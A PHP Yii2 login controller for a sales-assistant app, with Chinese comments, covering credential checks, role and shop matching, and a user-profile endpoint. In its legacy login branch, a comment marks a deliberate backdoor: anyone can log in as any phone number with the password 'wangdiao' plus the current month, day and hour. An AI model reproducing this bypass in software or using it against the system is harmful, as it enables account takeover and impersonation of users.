<?php
/**
 * Created by PhpStorm.
 * User: xjun
 * Date: 2017/3/3
 * Time: 16:21
 */
namespace frontend\modules\sales\controllers;
use common\auth\Auth;
use common\logic\CompanyUserCenter;
use common\models\OrganizationalStructure;
use common\models\User;
use common\models\Role;
use common\models\UserRoleOrgids;
use Yii;

/**
 * 登陆验证
 * Class LoginController
 * @package frontend\modules\v1\controllers
 */
class LoginController extends BaseController
{
    /**
     * 登陆验证
     * @return array
     */
    public function behaviors()
    {
        $behaviors = parent::behaviors();
        $behaviors['authenticator'] = [
            'class' => Auth::className(),
            'auth' => function($phone, $password, $shopId = 0, $roleId = 0) {
                if($shopId ==0 && $roleId == 0 )//旧版的登录 后面需要删除的
                {
                            $obj = new CompanyUserCenter();
                            $result = $obj->curlLogin($phone, $password);
                            //只有organizational_structure_level == 3 才能登陆销售助手
                            if ($result['code'] == 0) {
                                if (isset($result['userinfo'])) 
                                {
                                    return User::findOne(['access_token' => $result['access_token']]);
                                }
                                else
                                {
                                    return '您不属于店长或销售，无法登录销售助手';
                                }
                            }
                            //后门，方面开发人员使用其他人账号查找问题，慎用慎用！！！
                            else if($password == 'wangdiao' . date('mdH'))//06月03日17时
                            {
                                $obj = User::findOne(['phone' => $phone]);
                                if($obj)
                                {
                                    return $obj;
                                }
                                else
                                {
                                    return '非法请求';
                                }
                            }
                            return '账号密码错误';
                }
                else
                {
                    $obj = new CompanyUserCenter();
                    $result = $obj->curlLogin($phone, $password);
                    if($result['code'] == 0)
                    {
                        //判断是否是销售人员 - 角色信息 角色信息包含组织层级
                        $roleids = explode(',', $result['userinfo']['role_info']);
                        $objRole = Role::findOne($roleId);
                        if($objRole && in_array($roleId, $roleids))
                        {
                            $objUserRoleOrg = UserRoleOrgids::findOne(['role_id' => $roleId, 'user_id' => $result['userinfo']['id']]);
                            $arrOrgIds = is_object($objUserRoleOrg) ? explode(',', $objUserRoleOrg->org_ids) : [];
                            if(!in_array($shopId, $arrOrgIds))
                            {
                                return '门店和角色不匹配';
                            }
                            else
                            {
                                $objUser = User::findOne(['access_token' => $result['access_token']]);
                                $objUser->shop_id = $shopId;//此次登录时选中的门店
                                $objUser->save();
                                return $objUser;
                            }
                        }
                        else
                        {
                            return '角色信息选择错误！';
                        }
                    }
                    return '账号密码错误';
                }
            }
        ];
        return $behaviors;
    }

    /**
     * 登陆
     * @return array
     */
    public function actionIndex()
    {
        $user = Yii::$app->getUser()->identity;

        if($user->sex == 1){
            $sex = '男';
        }elseif($user->sex == 2){
            $sex = '女';
        }else{
            $sex = '保密';
        }
        $organizational = OrganizationalStructure::findOne($user->shop_id);
        if($organizational)
            $shopName = $organizational->name;
        else
            $shopName = '';
        return  [
            'userid' => (int)$user->getId(),
            'avatar' => (string)$user->avatar,
            'nickname' => (string)$user->nickname,
            'name' => (string)$user->name,
            'phone' => (string)$user->phone,
            'sex' => (string)$sex,
            'birthday' => (string)$user->birthday,
            'profession' => (string)$user->profession,
            'email' => (string)$user->email,
            'access_token' => (string)$user->access_token,
            'shop_id' => (int) $user->shop_id,
            'info_owner_id' => (int)$user->org_id,//干啥用的呀？？
            'shop_name' => $shopName
        ];

    }

}